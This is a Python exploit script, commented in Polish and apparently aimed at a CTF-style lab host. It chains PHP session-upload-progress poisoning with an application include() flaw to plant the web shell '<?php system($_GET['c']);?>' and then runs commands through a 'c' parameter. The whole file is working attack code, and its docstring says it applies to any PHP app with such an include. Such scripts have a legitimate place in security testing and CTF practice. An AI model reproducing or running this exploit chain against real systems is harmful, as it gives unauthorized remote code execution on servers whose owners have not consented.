#!/usr/bin/env python3
"""
Chain: session-file poisoning -> include() sink.
Dziala na KAZDYM PHP z session.upload_progress + aplikacyjnym include().
Nie jest to CVE-2026-109618 - to wada aplikacji (jak w CTF).
"""
import http.client, secrets, sys, urllib.parse

HOST = sys.argv[1] if len(sys.argv) > 1 else "pandora"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8088
SID = secrets.token_hex(16)
BND = "----pv" + secrets.token_hex(6)
SAVE_PATH = "/tmp/sess"
PAYLOAD = "<?php system($_GET['c']);?>"

def post_poison():
    body = b""
    body += (f"--{BND}\r\n"
             'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
             ).encode() + PAYLOAD.encode() + b"\r\n"
    body += (f"--{BND}\r\n"
             'Content-Disposition: form-data; name="image"; filename="p.png"\r\n'
             "Content-Type: image/png\r\n\r\n").encode() + b"\x89PNG\r\n\x1a\n" + b"A"*4096 + b"\r\n"
    body += f"--{BND}--\r\n".encode()
    c = http.client.HTTPConnection(HOST, PORT, timeout=20)
    c.request("POST", "/index.php",
              body=body,
              headers={"Content-Type": f"multipart/form-data; boundary={BND}",
                       "Cookie": f"PHPSESSID={SID}",
                       "Content-Length": str(len(body))})
    r = c.getresponse(); data = r.read(); c.close()
    return r.status, data

def try_include():
    sess = f"{SAVE_PATH}/sess_{SID}"
    q = urllib.parse.quote(sess, safe="")
    c = http.client.HTTPConnection(HOST, PORT, timeout=20)
    c.request("GET", f"/view.php?tpl={q}", headers={"Cookie": f"PHPSESSID={SID}"})
    r = c.getresponse(); data = r.read().decode("utf-8","replace"); c.close()
    return r.status, data

if __name__ == "__main__":
    print(f"[*] sid={SID}")
    st, body = post_poison()
    print(f"[*] POST /index.php -> {st} ({len(body)}B)  session poisoned")
    st2, out = try_include()
    print(f"[*] GET /view.php?tpl=/tmp/sess/sess_{SID} -> {st2}")
    if "<?php" in out or st2 != 200:
        print("[!] include zwrocil surowy tekst lub blad - sprawdz save_path")
    # teraz RCE przez ?c=
    cmd = "id; echo PWNED"
    c2 = http.client.HTTPConnection(HOST, PORT, timeout=20)
    q2 = urllib.parse.urlencode({"tpl": f"{SAVE_PATH}/sess_{SID}", "c": cmd})
    c2.request("GET", f"/view.php?{q2}", headers={"Cookie": f"PHPSESSID={SID}"})
    r2 = c2.getresponse(); out2 = r2.read().decode("utf-8","replace"); c2.close()
    print(f"[*] GET z ?c=id -> {r2.status}")
    print(f"[+] OUTPUT:\n{out2[:400]}")
